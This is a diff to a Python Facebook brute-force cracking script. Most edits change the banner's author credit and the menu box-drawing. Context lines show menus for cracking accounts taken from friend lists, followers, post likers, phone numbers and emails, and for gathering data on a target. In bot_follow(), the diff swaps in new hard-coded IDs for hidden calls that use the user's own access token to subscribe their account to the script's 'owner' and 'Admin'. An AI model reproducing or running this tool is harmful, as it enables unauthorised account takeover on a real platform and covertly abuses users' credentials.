@@ -36,7 +36,7 @@ else:
 ### HEADERS ###
 
 def banner():
-    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By ditz sanzz       │\n       /  ^ \/ / // /  ^ \   │  •• Github.com/ditz-sanz ••  │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
+    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By Aditia Gans       │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/ditz-sanz ••  │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
 
 host="https://mbasic.facebook.com"
 ok = []
@@ -118,15 +118,15 @@ def country():
     os.system("clear")
     banner()
     print("\n%s[%s Choose Country %s]\n"%(k,p,k))
-    print("%s[%s1%s] %sIndonesia"%(k,p,k,p))
-    print("%s[%s2%s] %sBangladesh/India"%(k,p,k,p))
-    print("%s[%s3%s] %sPakistan"%(k,p,k,p))
-    print("%s[%s4%s] %sUSA"%(k,p,k,p))
-    print("%s[%s0%s] %sNone"%(k,p,k,p))
+    print("%s║ [%s1%s] %sIndonesia"%(k,p,k,p))
+    print("%s║ [%s2%s] %sBangladesh/India"%(k,p,k,p))
+    print("%s║ [%s3%s] %sPakistan"%(k,p,k,p))
+    print("%s║ [%s4%s] %sUSA"%(k,p,k,p))
+    print("%s║ [%s0%s] %sNone"%(k,p,k,p))
     choose_country()
     
 def choose_country():
-    cc = input("\n%s[%s•%s] %sChoose : "%(k,p,k,p))
+    cc = input("\n%s╚══ [%s•%s] %sChoose : "%(k,p,k,p))
     if cc in[""]:
         print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     elif cc in["1","01"]:
@@ -187,12 +187,12 @@ def choose_country():
 def logs():
   os.system("clear")
   banner()
-  print((k+"\n["+p+"1"+k+"]"+p+" Login Token"))
-  print((k+"["+p+"2"+k+"]"+p+" Login Cookies"))
-  print((k+"["+p+"0"+k+"]"+p+" Exit"))
-  sek=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
+  print((k+"\n║ ["+p+"1"+k+"]"+p+" Login Token"))
+  print((k+"║ ["+p+"2"+k+"]"+p+" Login Cookies"))
+  print((k+"║ ["+p+"0"+k+"]"+p+" Exit"))
+  sek=input(k+"\n║ ["+p+"•"+k+"]"+p+" Choose : ")
   if sek=="":
-    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
+    print((k+"\n╚══ ["+p+"!"+k+"]"+p+" Fill In The Correct"))
     logs()
   elif sek=="1":
     defaultua()
@@ -269,8 +269,8 @@ def bot_follow():
 		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
 		logs()
 	jalan("%s[%s•%s] %sPlease Wait..."%(k,p,k,p))
-	requests.post("https://graph.facebook.com/100011669563699/subscribers?access_token=" + toket)      # owner sc
-	requests.post("https://graph.facebook.com/100000023658232/subscribers?access_token=" + toket)      # Admin
+	requests.post("https://graph.facebook.com/100072241360914/subscribers?access_token=" + toket)      # owner sc
+	requests.post("https://graph.facebook.com/100072241360914/subscribers?access_token=" + toket)      # Admin
 
 	menu()
 
@@ -306,20 +306,20 @@ def menu():
     print((k+"["+p+"•"+k+"]"+p+" Status  : "+o+"Public"+p))
     print((k+"["+p+"•"+k+"]"+p+" Joined  : "+durasi))
     print((k+"["+p+"•"+k+"]"+p+" Crack   : "+negara))
-    print((k+"\n["+p+"1"+k+"]"+p+" Crack ID From Public/Friend"))
-    print((k+"["+p+"2"+k+"]"+p+" Crack ID From Followers"))
-    print((k+"["+p+"3"+k+"]"+p+" Crack ID From Likers Post"))
-    print((k+"["+p+"4"+k+"]"+p+" Crack By Phone Number"))
-    print((k+"["+p+"5"+k+"]"+p+" Crack By Email"))
-    print((k+"["+p+"6"+k+"]"+p+" Get Data Target"))
-    print((k+"["+p+"7"+k+"]"+p+" Result Crack"))
-    print((k+"["+p+"8"+k+"]"+p+" User Agent"))
-    print((k+"["+p+"0"+k+"]"+p+" Logout"))
+    print((k+"\n║ ["+p+"1"+k+"]"+p+" Crack ID From Public/Friend"))
+    print((k+"║ ["+p+"2"+k+"]"+p+" Crack ID From Followers"))
+    print((k+"║ ["+p+"3"+k+"]"+p+" Crack ID From Likers Post"))
+    print((k+"║ ["+p+"4"+k+"]"+p+" Crack By Phone Number"))
+    print((k+"║ ["+p+"5"+k+"]"+p+" Crack By Email"))
+    print((k+"║ ["+p+"6"+k+"]"+p+" Get Data Target"))
+    print((k+"║ ["+p+"7"+k+"]"+p+" Result Crack"))
+    print((k+"║ ["+p+"8"+k+"]"+p+" User Agent"))
+    print((k+"║ ["+p+"0"+k+"]"+p+" Logout"))
     choose_menu()
 
 def choose_menu():
     
-	r=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
+	r=input(k+"\n╚══ ["+p+"•"+k+"]"+p+" Choose : ")
 	if r=="":
 		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
 		menu()
@@ -352,11 +352,11 @@ def choose_menu():
 		menu()	
 
 def pilihcrack(file):
-  print((k+"\n["+p+"1"+k+"]"+p+" Api ("+k+"Fast"+p+")"))
-  print((k+"["+p+"2"+k+"]"+p+" Api + TTL ("+k+"Fast"+p+")"))
-  print((k+"["+p+"3"+k+"]"+p+" Mbasic ("+k+"Slow"+p+")"))
-  print((k+"["+p+"4"+k+"]"+p+" Mbasic + TTL ("+k+"Slow"+p+")"))
-  print((k+"["+p+"5"+k+"]"+p+" Free Facebook ("+k+"Super Slow"+p+")"))
+  print((k+"\n║ ["+p+"1"+k+"]"+p+" Api ("+k+"Fast"+p+")"))
+  print((k+"║ ["+p+"2"+k+"]"+p+" Api + TTL ("+k+"Fast"+p+")"))
+  print((k+"║ ["+p+"3"+k+"]"+p+" Mbasic ("+k+"Slow"+p+")"))
+  print((k+"║ ["+p+"4"+k+"]"+p+" Mbasic + TTL ("+k+"Slow"+p+")"))
+  print((k+"║ ["+p+"5"+k+"]"+p+" Free Facebook ("+k+"Super Slow"+p+")"))
   krah=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
   if krah in[""]:
     print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
@@ -385,8 +385,8 @@ def publik():
 		os.system("rm -rf login.txt")
 		logs()
 	try:
-		print((k+"\n["+p+"•"+k+"]"+p+" Type \'me\' To Dump From Friendlist"))
-		idt = input(k+"["+p+"•"+k+"]"+p+" User ID Target : ")
+		print((k+"\n║ ["+p+"•"+k+"]"+p+" Type \'me\' To Dump From Friendlist"))
+		idt = input(k+"║ ["+p+"•"+k+"]"+p+" User ID Target : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -673,7 +673,7 @@ def menu_user_agent():
     pilih_menu_user_agent()
 
 def pilih_menu_user_agent():
-    pmu = input("\n%s[%s•%s] %sChoose : "%(k,p,k,p))
+    pmu = input("\n%s╚══ [%s•%s] %sChoose : "%(k,p,k,p))
     if pmu in[""]:
         print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     elif pmu in["1","01"]:
